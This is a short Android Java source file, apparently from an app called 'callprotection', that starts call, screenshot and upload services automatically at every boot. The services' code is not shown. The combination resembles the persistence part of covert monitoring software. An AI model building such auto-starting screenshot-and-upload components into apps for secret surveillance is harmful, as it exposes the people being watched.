package com.daria.callprotection;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "BOOT_COMPLETED received, starting services");

            context.startForegroundService(new Intent(context, CallService.class));
            context.startForegroundService(new Intent(context, ScreenshotService.class));
            context.startForegroundService(new Intent(context, UploadService.class));
        }
    }
}
